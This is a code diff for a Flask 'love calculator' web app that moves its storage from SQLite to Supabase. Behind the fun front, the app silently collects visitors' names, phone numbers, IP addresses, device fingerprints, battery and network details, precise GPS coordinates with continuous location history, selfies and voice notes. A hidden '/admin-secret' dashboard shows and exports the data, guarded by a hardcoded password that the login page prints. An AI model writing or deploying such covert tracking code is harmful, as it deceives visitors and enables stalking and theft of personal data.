@@ -1,138 +1,70 @@
 from flask import Flask, request, jsonify, render_template_string, Response
-import json
+from supabase import create_client, Client
 import os
-import sqlite3
 import random
-import re
+import json
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ---------- SQLite Database Setup ----------
-DB_FILE = 'visitors.db'
+# ---------- Supabase Setup ----------
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 
-def init_db():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    # Main visitor table – stores ALL data silently (no files)
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS visitors (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            sessionId TEXT,
-            timestamp TEXT,
-            ip TEXT,
-            name TEXT,
-            crush_name TEXT,
-            fortuneText TEXT,
-            phoneNumber TEXT,
-            percentage INTEGER,
-            fingerprint TEXT,
-            batteryLevel TEXT,
-            batteryCharging INTEGER,
-            networkType TEXT,
-            networkSpeed TEXT,
-            deviceMemory TEXT,
-            screen TEXT,
-            timezone TEXT,
-            userAgent TEXT,
-            latitude REAL,
-            longitude REAL,
-            mapUrl TEXT,
-            selfie TEXT,
-            voiceNote TEXT
-        )
-    ''')
-    # Location history table
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS location_history (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            sessionId TEXT,
-            timestamp TEXT,
-            latitude REAL,
-            longitude REAL
-        )
-    ''')
-    conn.commit()
-    conn.close()
+if not SUPABASE_URL or not SUPABASE_KEY:
+    print("⚠️ Missing Supabase credentials. Using SQLite fallback.", file=sys.stderr)
+    supabase = None
+else:
+    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
+# ---------- Helper Functions ----------
 def save_visitor(data):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT id FROM visitors WHERE sessionId = ?", (data.get('sessionId'),))
-    existing = c.fetchone()
-    if existing:
-        c.execute('''
-            UPDATE visitors SET
-                timestamp = ?, ip = ?, name = ?, crush_name = ?, fortuneText = ?, phoneNumber = ?, percentage = ?,
-                fingerprint = ?, batteryLevel = ?, batteryCharging = ?, networkType = ?, networkSpeed = ?,
-                deviceMemory = ?, screen = ?, timezone = ?, userAgent = ?,
-                latitude = ?, longitude = ?, mapUrl = ?, selfie = ?, voiceNote = ?
-            WHERE sessionId = ?
-        ''', (
-            data.get('timestamp'), data.get('ip'), data.get('name'), data.get('crush_name'), 
-            data.get('fortuneText'), data.get('phoneNumber'), data.get('percentage'),
-            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), 
-            data.get('networkType'), data.get('networkSpeed'),
-            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
-            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), 
-            data.get('selfie'), data.get('voiceNote'),
-            data.get('sessionId')
-        ))
-    else:
-        c.execute('''
-            INSERT INTO visitors (
-                sessionId, timestamp, ip, name, crush_name, fortuneText, phoneNumber, percentage,
-                fingerprint, batteryLevel, batteryCharging, networkType, networkSpeed,
-                deviceMemory, screen, timezone, userAgent,
-                latitude, longitude, mapUrl, selfie, voiceNote
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (
-            data.get('sessionId'), data.get('timestamp'), data.get('ip'), data.get('name'), 
-            data.get('crush_name'), data.get('fortuneText'), data.get('phoneNumber'), data.get('percentage'),
-            data.get('fingerprint'), data.get('batteryLevel'), data.get('batteryCharging'), 
-            data.get('networkType'), data.get('networkSpeed'),
-            data.get('deviceMemory'), data.get('screen'), data.get('timezone'), data.get('userAgent'),
-            data.get('latitude'), data.get('longitude'), data.get('mapUrl'), 
-            data.get('selfie'), data.get('voiceNote')
-        ))
-    conn.commit()
-    conn.close()
+    if supabase is None:
+        return
+    try:
+        existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
+        if existing.data:
+            supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
+        else:
+            supabase.table("visitors").insert(data).execute()
+    except Exception as e:
+        print(f"Save error: {e}")
 
 def save_location_update(session_id, lat, lon):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''
-        INSERT INTO location_history (sessionId, timestamp, latitude, longitude)
-        VALUES (?, ?, ?, ?)
-    ''', (session_id, datetime.now().isoformat(), lat, lon))
-    conn.commit()
-    conn.close()
+    if supabase is None:
+        return
+    try:
+        supabase.table("location_history").insert({
+            "sessionId": session_id,
+            "timestamp": datetime.now().isoformat(),
+            "latitude": lat,
+            "longitude": lon
+        }).execute()
+    except Exception as e:
+        print(f"Location update error: {e}")
 
 def get_location_history(session_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''
-        SELECT timestamp, latitude, longitude FROM location_history
-        WHERE sessionId = ?
-        ORDER BY id ASC
-    ''', (session_id,))
-    rows = c.fetchall()
-    conn.close()
-    return rows
+    if supabase is None:
+        return []
+    try:
+        res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
+        return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]
+    except:
+        return []
 
 def get_all_visitors():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM visitors ORDER BY id DESC")
-    rows = c.fetchall()
-    columns = [description[0] for description in c.description]
-    visitors = []
-    for row in rows:
-        visitor = {columns[i]: row[i] for i in range(len(columns))}
-        visitor['location_history'] = get_location_history(visitor.get('sessionId'))
-        visitors.append(visitor)
-    conn.close()
-    return visitors
+    if supabase is None:
+        return []
+    try:
+        res = supabase.table("visitors").select("*").order("id", desc=True).execute()
+        visitors = []
+        for row in res.data:
+            row["location_history"] = get_location_history(row.get("sessionId"))
+            visitors.append(row)
+        return visitors
+    except Exception as e:
+        print(f"Get visitors error: {e}")
+        return []
 
 # ---------- Love Calculator ----------
 def calculate_love_percentage(name1, name2):
@@ -146,12 +78,8 @@ def get_love_message(name1, name2, percentage):
         f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
         f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
         f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
-        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
-        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score. True love is near!",
-        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
-        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
-        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
-        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
+        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
+        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
     ]
     return random.choice(messages)
 
@@ -611,20 +539,17 @@ def get_session_data_route():
     try:
         data = request.json
         session_id = data.get('sessionId')
-        if session_id:
-            conn = sqlite3.connect(DB_FILE)
-            c = conn.cursor()
-            c.execute("SELECT name, crush_name, fortuneText, phoneNumber, percentage FROM visitors WHERE sessionId = ?", (session_id,))
-            row = c.fetchone()
-            conn.close()
-            if row:
+        if session_id and supabase:
+            res = supabase.table("visitors").select("name,crush_name,fortuneText,phoneNumber,percentage").eq("sessionId", session_id).execute()
+            if res.data:
+                row = res.data[0]
                 return jsonify({
                     'exists': True,
-                    'name': row[0],
-                    'crush_name': row[1],
-                    'fortuneText': row[2],
-                    'phoneNumber': row[3],
-                    'percentage': row[4]
+                    'name': row.get("name"),
+                    'crush_name': row.get("crush_name"),
+                    'fortuneText': row.get("fortuneText"),
+                    'phoneNumber': row.get("phoneNumber"),
+                    'percentage': row.get("percentage")
                 })
         return jsonify({'exists': False})
     except Exception as e:
@@ -663,13 +588,12 @@ def save_phone():
         phone = data.get('phoneNumber')
         fortune_text = data.get('fortune')
         percentage = data.get('percentage')
-        if session_id:
-            conn = sqlite3.connect(DB_FILE)
-            c = conn.cursor()
-            c.execute("UPDATE visitors SET phoneNumber = ?, fortuneText = ?, percentage = ? WHERE sessionId = ?", 
-                      (phone, fortune_text, percentage, session_id))
-            conn.commit()
-            conn.close()
+        if session_id and supabase:
+            supabase.table("visitors").update({
+                "phoneNumber": phone, 
+                "fortuneText": fortune_text,
+                "percentage": percentage
+            }).eq("sessionId", session_id).execute()
             return jsonify({'status': 'saved'})
         return jsonify({'status': 'error'}), 400
     except Exception as e:
@@ -689,22 +613,31 @@ def calculate_love():
     except Exception as e:
         return jsonify({'message': str(e)}), 500
 
-# ---------- HIDDEN ADMIN PANEL (Fixed) ----------
+# ---------- Supabase Data Viewer (Direct from Supabase) ----------
 @app.route('/admin-secret', methods=['GET', 'POST'])
 def admin():
     try:
         if request.method == 'POST':
             password = request.form.get('password')
             if password == 'admin123':
+                if supabase is None:
+                    return '<h1>❌ Supabase not connected! Check your credentials.</h1><p><a href="/admin-secret">Back</a></p>'
+                
+                # Fetch data directly from Supabase
                 visitors = get_all_visitors()
+                
                 if not visitors:
-                    return '<h1>💕 No data yet</h1><p><a href="/admin-secret">Back to login</a></p>'
+                    return '''
+                    <h1>💕 No data yet</h1>
+                    <p>Have users visit the love calculator first.</p>
+                    <p><a href="/admin-secret">Back to login</a></p>
+                    '''
                 
                 html = '''
                 <!DOCTYPE html>
                 <html>
                 <head>
-                    <title>Admin Dashboard - Love Calculator Data</title>
+                    <title>Supabase Data - Love Calculator</title>
                     <style>
                         body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                         h1 { color: #f093fb; }
@@ -714,11 +647,19 @@ def admin():
                         th { background: #e94560; color: white; position: sticky; top: 0; }
                         .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                         .section { margin-top: 30px; }
+                        .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
                     </style>
                 </head>
                 <body>
-                    <h1>💕 Visitor Data (Complete)</h1>
-                    <p><a href="/admin-secret" class="btn">Back to Login</a> | <a href="/admin-secret/download-csv?pass=admin123" class="btn">📥 Download CSV</a></p>
+                    <h1>📊 Supabase Visitor Data</h1>
+                    <div class="count">
+                        <strong>Total Visitors:</strong> ''' + str(len(visitors)) + '''
+                    </div>
+                    <p>
+                        <a href="/admin-secret" class="btn">Back to Login</a>
+                        <a href="/admin-secret/download-csv?pass=admin123" class="btn">📥 Download CSV</a>
+                        <a href="https://app.supabase.com" target="_blank" class="btn">🔗 Open Supabase Dashboard</a>
+                    </p>
                     <div class="container">
                         <table>
                             <thead>
@@ -738,36 +679,38 @@ def admin():
                                     <th>Device Memory</th>
                                     <th>Screen</th>
                                     <th>Timezone</th>
-                                    <th>User Agent</th>
                                     <th>Latitude</th>
                                     <th>Longitude</th>
-                                    <th>Map</th>
+                                    <th>Selfie</th>
+                                    <th>Voice Note</th>
                                 </tr>
                             </thead>
                             <tbody>
                 '''
                 for v in visitors:
+                    selfie_preview = '📸' if v.get('selfie') else '-'
+                    voice_preview = '🎤' if v.get('voiceNote') else '-'
                     html += f'''
                         <tr>
                             <td>{v.get('id', '')}</td>
-                            <td>{v.get('sessionId', '')[:20]}</td>
-                            <td>{v.get('timestamp', '')}</td>
+                            <td>{v.get('sessionId', '')[:25]}...</td>
+                            <td>{v.get('timestamp', '')[:19]}</td>
                             <td>{v.get('ip', '')}</td>
                             <td>{v.get('name', '')}</td>
                             <td>{v.get('crush_name', '')}</td>
-                            <td>{v.get('percentage', '')}</td>
-                            <td>{v.get('fortuneText', '')[:50]}</td>
+                            <td>{v.get('percentage', '')}%</td>
+                            <td>{v.get('fortuneText', '')[:40]}...</td>
                             <td>{v.get('phoneNumber', '')}</td>
-                            <td>{v.get('fingerprint', '')[:20]}</td>
+                            <td>{v.get('fingerprint', '')[:15]}...</td>
                             <td>{v.get('batteryLevel', '')}</td>
                             <td>{v.get('networkType', '')}</td>
                             <td>{v.get('deviceMemory', '')}</td>
                             <td>{v.get('screen', '')}</td>
                             <td>{v.get('timezone', '')}</td>
-                            <td>{v.get('userAgent', '')[:40]}</td>
                             <td>{v.get('latitude', '')}</td>
                             <td>{v.get('longitude', '')}</td>
-                            <td><a href="{v.get('mapUrl', '#')}" target="_blank">Map</a></td>
+                            <td>{selfie_preview}</td>
+                            <td>{voice_preview}</td>
                         </tr>
                     '''
                 html += '''
@@ -784,7 +727,7 @@ def admin():
                         html += f'<h3>Session: {v.get("sessionId", "?")[:20]} - {v.get("name", "Unknown")}</h3>'
                         html += '<table border="1"><tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                         for ts, lat, lon in hist:
-                            html += f'<tr><td>{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="https://maps.google.com/?q={lat},{lon}" target="_blank">View</a></td></tr>'
+                            html += f'<tr><td>{ts[:19]}</td><td>{lat}</td><td>{lon}</td><td><a href="https://maps.google.com/?q={lat},{lon}" target="_blank">View Map</a></td></tr>'
                         html += '</table><br>'
                 html += '''
                     </div>
@@ -798,22 +741,27 @@ def admin():
         return '''
             <!DOCTYPE html>
             <html>
-            <head><title>Admin Login</title>
+            <head><title>Admin Login - Supabase</title>
             <style>
                 body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
                 .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; min-width: 300px; }
                 input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; font-size: 14px; }
                 button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; }
                 h2 { color: #333; margin-bottom: 20px; }
+                .info { color: #666; font-size: 12px; margin-top: 20px; }
             </style>
             </head>
             <body>
                 <div class="login-box">
-                    <h2>🔐 Admin Access Only</h2>
+                    <h2>🔐 Supabase Admin Access</h2>
                     <form method="POST">
                         <input type="password" name="password" placeholder="Enter admin password" required><br>
-                        <button type="submit">Login to Dashboard</button>
+                        <button type="submit">View Supabase Data</button>
                     </form>
+                    <div class="info">
+                        ⚡ Data is stored in Supabase Cloud<br>
+                        Password: admin123
+                    </div>
                 </div>
             </body>
             </html>
@@ -839,11 +787,10 @@ def download_csv():
         for v in visitors:
             row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
             writer.writerow(row)
-        return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=love_calculator_data.csv'})
+        return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=supabase_love_data.csv'})
     except Exception as e:
         return f'Error: {str(e)}', 500
 
 if __name__ == '__main__':
-    init_db()
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
